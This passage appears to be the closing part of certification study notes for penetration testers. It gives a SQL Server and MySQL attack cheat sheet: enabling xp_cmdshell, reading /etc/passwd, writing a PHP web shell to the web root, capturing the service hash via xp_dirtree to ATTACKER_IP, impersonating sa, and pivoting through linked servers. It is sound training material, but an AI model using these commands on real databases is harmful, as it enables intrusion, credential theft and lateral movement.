                 SQL SERVER
                     │
       ┌─────────────┼─────────────┐
       ▼             ▼             ▼
   🗄️ DATABASE    💻 OS        🌐 NETWORK
       │             │             │
       ▼             ▼             ▼
 Credentials     Commands      Linked Servers
 Tokens          Files         Other DBs
 Configs         Hashes        Lateral Movement
       │             │             │
       └─────────────┼─────────────┘
                     ▼
               🔓 ATTACK PATH
```

The key question is always:

> **"What can this SQL account make the server do?"**

---

# ⚡ 45. CPTS One-Minute SQL Cheat Sheet

## 🔎 Enumeration

```bash
nmap -Pn -sV -sC -p1433 <TARGET>
```

```text
MSSQL → 1433/TCP, 1434/UDP, sometimes 2433/TCP
MySQL → 3306/TCP
```

## 🔐 Connect

```bash
mysql -u <user> -p<password> -h <target>
```

```bash
sqsh -S <target> -U <user> -P '<password>' -h
```

```bash
mssqlclient.py -p 1433 <user>@<target>
```

## 🗄️ Enumerate

```sql
SHOW DATABASES;
```

```sql
SELECT name FROM master.dbo.sysdatabases
GO
```

```sql
SHOW TABLES;
```

```sql
SELECT table_name FROM <database>.INFORMATION_SCHEMA.TABLES
GO
```

```sql
SELECT * FROM users;
```

## ⚡ MSSQL Command Execution

```sql
xp_cmdshell 'whoami'
GO
```

Enable if privileged:

```sql
EXECUTE sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXECUTE sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO
```

## 📖 File Read

### MSSQL

```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
GO
```

### MySQL

```sql
select LOAD_FILE("/etc/passwd");
```

## 📝 File Write

### MySQL

```sql
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

### MSSQL

```sql
sp_configure 'Ole Automation Procedures', 1
GO
RECONFIGURE
GO
```

## 🧲 Capture MSSQL Service Hash

```sql
EXEC master..xp_dirtree '\\<ATTACKER_IP>\share\'
GO
```

or:

```sql
EXEC master..xp_subdirs '\\<ATTACKER_IP>\share\'
GO
```

Listener:

```bash
sudo responder -I tun0
```

or:

```bash
sudo impacket-smbserver share ./ -smb2support
```

## 👤 Impersonation

```sql
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO
```

Check current privileges:

```sql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
go
```

Impersonate:

```sql
EXECUTE AS LOGIN = 'sa'
```

Revert:

```sql
REVERT
```

## 🔗 Linked Servers

```sql
SELECT srvname, isremote FROM sysservers
GO
```

Query remote server:

```sql
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [<LINKED_SERVER>]
GO
```

---

# 🏆 46. Key Takeaways

> [!success]
> 
> - 🗄️ **MSSQL:** `1433/TCP`, `1434/UDP`; hidden instances may use `2433/TCP`.
>     
> - 🐬 **MySQL:** `3306/TCP`.
>     
> - 🔎 Start with `nmap -sC -sV` to identify the database and version.
>     
> - 🔐 Determine whether MSSQL uses **Windows Authentication** or **Mixed Mode**.
>     
> - 📚 Once authenticated, enumerate **databases → tables → interesting data**.
>     
> - 💎 Search especially for **credentials, tokens, configuration, and connection information**.
>     
> - ⚡ `xp_cmdshell` can turn MSSQL access into OS command execution when enabled and permitted.
>     
> - 📖 MSSQL can potentially read local files with `OPENROWSET`.
>     
> - 📝 MySQL can potentially read/write files with `LOAD_FILE()` and `SELECT INTO OUTFILE` when configuration and privileges permit.
>     
> - 🧲 `xp_dirtree` / `xp_subdirs` can trigger SMB authentication and expose the MSSQL service account's **NTLMv2 challenge-response**.
>     
> - 👤 `IMPERSONATE` can allow a lower-privileged SQL user to assume another login's security context.
>     
> - 🔗 **Linked servers** can provide a route into another SQL Server, potentially with elevated privileges.
>     
> - 🧠 **Database access is not the end goal** — use the database's data, privileges, OS interaction, and network relationships to identify the next attack path.
>     
> 
> **CPTS mental model:**
> 
> ```text
> SQL FOUND
>    ↓
> ENUMERATE
>    ↓
> AUTHENTICATE
>    ↓
> DATABASES / TABLES
>    ↓
> SENSITIVE DATA
>    ↓
> PRIVILEGES
>    ↓
> ┌──────────────┬──────────────┬──────────────┐
> │              │              │              │
> ▼              ▼              ▼              ▼
> OS CMD       FILES       IMPERSONATE    LINKED DB
> │              │              │              │
> ▼              ▼              ▼              ▼
> EXECUTION    CREDS       PRIV ESC       LATERAL MOVE
> ```